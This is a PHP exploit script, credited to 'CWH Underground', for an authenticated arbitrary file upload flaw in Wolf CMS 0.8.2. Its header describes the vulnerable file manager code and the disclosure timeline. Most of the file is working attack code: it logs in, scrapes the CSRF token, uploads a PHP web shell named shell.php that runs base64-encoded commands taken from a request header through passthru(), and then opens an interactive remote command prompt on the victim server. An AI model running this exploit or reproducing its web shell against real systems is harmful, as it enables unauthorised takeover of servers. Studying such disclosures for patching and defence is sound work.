<?php
/*
  
  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /        
  / XXXXXX /
 (________(          
  `------'
   
 Exploit Title   : Wolf CMS Arbitrary File Upload Exploit
 Date            : 22 April 2015
 Exploit Author  : CWH Underground
 Discovered By   : ZeQ3uL
 Site            : www.2600.in.th
 Vendor Homepage : https://www.wolfcms.org/
 Software Link   : https://bitbucket.org/wolfcms/wolf-cms-downloads/downloads/wolfcms-0.8.2.zip
 Version         : 0.8.2
    
####################
SOFTWARE DESCRIPTION
####################
    
Wolf CMS is a content management system and is Free Software published under the GNU General Public License v3. 
Wolf CMS is written in the PHP programming language. Wolf CMS is a fork of Frog CMS.
    
#######################################
VULNERABILITY: Arbitrary File Upload
#######################################
     
This exploit a file upload vulnerability found in Wolf CMS 0.8.2, and possibly prior. Attackers can abuse the
upload feature in order to upload a malicious PHP file into the application with authenticated user, which results in arbitrary remote code execution.
 
The vulnerability was found on File Manager Function (Enabled by default), which provides interfaces to manage files from the administration. 
 
In this simple example, there are no restrictions made regarding the type of files allowed for uploading. 
Therefore, an attacker can upload a PHP shell file with malicious code that can lead to full control of a victim server. 
Additionally, the uploaded file can be moved to the root directory, meaning that the attacker can access it through the Internet.
    
/wolf/plugins/file_manager/FileManagerController.php (LINE: 302-339)
-----------------------------------------------------------------------------
// Clean filenames
        $filename = preg_replace('/ /', '_', $_FILES['upload_file']['name']);
        $filename = preg_replace('/[^a-z0-9_\-\.]/i', '', $filename);
 
        if (isset($_FILES)) {
            $file = $this->_upload_file($filename, FILES_DIR . '/' . $path . '/', $_FILES['upload_file']['tmp_name'], $overwrite);
 
            if ($file === false)
                Flash::set('error', __('File has not been uploaded!'));
        }
-----------------------------------------------------------------------------
 
#####################
Disclosure Timeline
#####################
 
[04/04/2015] - Issue reported to Developer Team
[08/04/2015] - Discussed for fixing the issue
[16/04/2015] - Issue reported to http://seclists.org/oss-sec/2015/q2/210
[22/04/2015] - Public disclosure
 
#####################################################
EXPLOIT
#####################################################
   
*/
  
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 50);
  
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
   
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
  
print "\n+---------------------------------------+";
print "\n| WolfCMS Arbitrary File Upload Exploit |";
print "\n+---------------------------------------+\n";
   
if ($argc < 5)
{
    print "\nUsage......: php $argv[0] <host> <path> <user> <pass>\n";
    print "\nExample....: php $argv[0] localhost /wolfcms test password\n";
    die();
}
  
$host = $argv[1];
$path = $argv[2];
$user = $argv[3];
$pass = $argv[4];
 
   print "\n  ,--^----------,--------,-----,-------^--,   \n";
   print "  | |||||||||   `--------'     |          O   \n";
   print "  `+---------------------------^----------|   \n";
   print "    `\_,-------, _________________________|   \n";
   print "      / XXXXXX /`|     /                      \n";
   print "     / XXXXXX /  `\   /                       \n";
   print "    / XXXXXX /\______(                        \n";
   print "   / XXXXXX /                                 \n";
   print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
   print " (________(                                   \n";
   print "  `------'                                    \n";
 
$login = "login[username]={$user}&login[password]={$pass}&login[redirect]=/wolfcms/?/admin/";
$packet  = "POST {$path}/?/admin/login/login HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: PHPSESSID=cwh\r\n";
$packet .= "Content-Length: ".strlen($login)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$login}"; 
    
$response = http_send($host, $packet);
 
 if (!preg_match_all("/Set-Cookie: ([^;]*);/i", $response, $sid)) die("\n[-] Session ID not found!\n");
 
$packet  = "GET {$path}/?/admin/plugin/file_manager HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: {$sid[1][2]}\r\n";
$packet .= "Connection: close\r\n\r\n";
$response=http_send($host, $packet);
 
if (!preg_match_all("/csrf_token\" type=\"hidden\" value=\"(.*?)\" \/>/i", $response, $token)) die("\n[-] The username/password is incorrect!\n");
print "\n[+] Login Successfully !!\n";
sleep(2);
print "\n[+] Retrieving The Upload token !!\n";
print "[+] The token is: {$token[1][4]}\n";
 
$payload  = "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"csrf_token\"\r\n\r\n";
$payload .= "{$token[1][4]}\r\n";
$payload .= "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"upload_file\"; filename=\"shell.php\"\r\n";
$payload .= "Content-Type: application/octet-stream\r\n\r\n";
$payload .= "<?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
$payload .= "--o0oOo0o--\r\n";
 
$packet  = "POST {$path}/?/admin/plugin/file_manager/upload HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: {$sid[1][2]}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
      
http_send($host, $packet);
 
$packet  = "GET {$path}/public/shell.php HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";
      
while(1)
{
    print "\nWolf-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}
 
################################################################################################################
# Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
?>
